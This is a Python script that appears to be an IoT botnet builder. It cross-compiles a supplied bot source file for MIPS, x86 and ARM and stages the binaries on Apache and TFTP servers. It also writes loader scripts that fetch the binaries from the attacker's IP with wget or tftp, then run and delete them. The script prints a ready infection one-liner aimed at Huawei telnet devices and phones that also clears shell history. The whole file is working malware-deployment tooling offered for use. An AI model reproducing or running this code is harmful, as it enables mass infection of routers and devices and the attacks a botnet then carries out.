import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

bot = sys.argv[1]

yourafag = raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["salviahuawei.mips",
             "salviatelnet.x86", 
             "salviazte.arm",]

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',]

ccs = ["cross-compiler-mips",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",]

def run(cmd):
    subprocess.call(cmd, shell=True)

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your apache2 and tftp")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("mv " + i + " /tftpboot")

run('echo -e "#!/bin/bash" > /tftpboot/salviat2.sh')

run('echo -e "ulimit -n 1024" >> /tftpboot/salviat2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /tftpboot/salviat2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/salviaw2.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/salviaw2.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /tftpboot/salviat2.sh')

print("\x1b[0;32mPAYLOAD FOR HUAWEI TELNETS AND PHONES\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp; wget http://" + ip + "/salviaw2.sh;chmod 777 salviaw2.sh;sh salviaw2.sh;tftp " + ip + " -c get salviat2.sh;chmod 777 salviat2.sh;sh salviat2.sh;rm -rf salviaw2.sh salviat2.sh;history -c\x1b[0m")